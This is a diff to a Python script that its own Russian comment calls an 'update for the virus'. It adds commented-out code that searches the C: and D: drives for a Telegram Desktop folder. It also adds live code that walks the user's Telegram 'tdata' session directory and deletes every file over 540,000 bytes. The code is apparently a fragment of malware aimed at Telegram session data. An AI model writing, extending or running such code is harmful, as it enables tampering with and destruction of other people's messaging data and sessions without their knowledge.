@@ -34,3 +34,35 @@ if __name__ == '__main__':
     ...
 
 
+# поиск нужной папки если ее нет в списке по умолчанию | обнова для вируса
+
+# ignore_folders = []
+# next_folder = True
+
+# for root, dirs, files in os.walk("D:\\"):
+#     dirs = [d for d in dirs if d not in ignore_folders]
+#     if 'Telegram Desktop' in dirs:
+#         print(os.path.join(root + '\\Telegram Desktop'))
+#         next_folder = False
+#         break
+
+# ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default']
+
+# if next_folder:
+#     for root, dirs, files in os.walk("C:\\"):
+#         dirs = [d for d in dirs if d not in ignore_folders]
+#         if 'Telegram Desktop' in dirs:
+#             print(os.path.join(root, 'Telegram Desktop'))
+#             break
+
+
+
+tg_path =  f'C:\\Users\\{current_user}\\AppData\\Local\\tdata'
+
+for root, dirs, files in os.walk(tg_path):
+    for file in files: # проверка всех файлов в текущей директории
+        if os.path.getsize(file_path:=os.path.join(root, file)) > 540000:
+            os.remove(file_path)
+
+
+
